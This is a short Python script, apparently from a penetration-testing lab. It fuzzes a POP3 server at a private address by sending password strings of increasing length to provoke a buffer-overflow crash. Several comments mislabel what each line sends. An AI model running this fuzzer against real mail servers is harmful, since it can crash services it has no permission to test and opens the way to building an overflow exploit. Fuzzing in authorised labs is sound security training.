#!/usr/bin/python
import socket

buffer=["B"]
count=100
while len(buffer) <=30:
    buffer.append("B"*count)
    count=count+200

for string in buffer:
    print "\nFuzzing PASS with %s bytes" % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('10.0.0.22',110)) 
    data = s.recv(1024)
    print data

    s.send('USER test' +'\r\n') # send username "test"
    data = s.recv(1024) # receive reply
    print data # print reply

    s.send('PASS ' + string + '\r\n') # send password "test"
    data = s.recv(1024) # receive reply
    print data # print reply

    s.send('QUIT' +'\r\n') # send username "test"
    data = s.recv(1024) # receive reply
    print data # print reply

    s.close() # close socket
    print "\nDone!"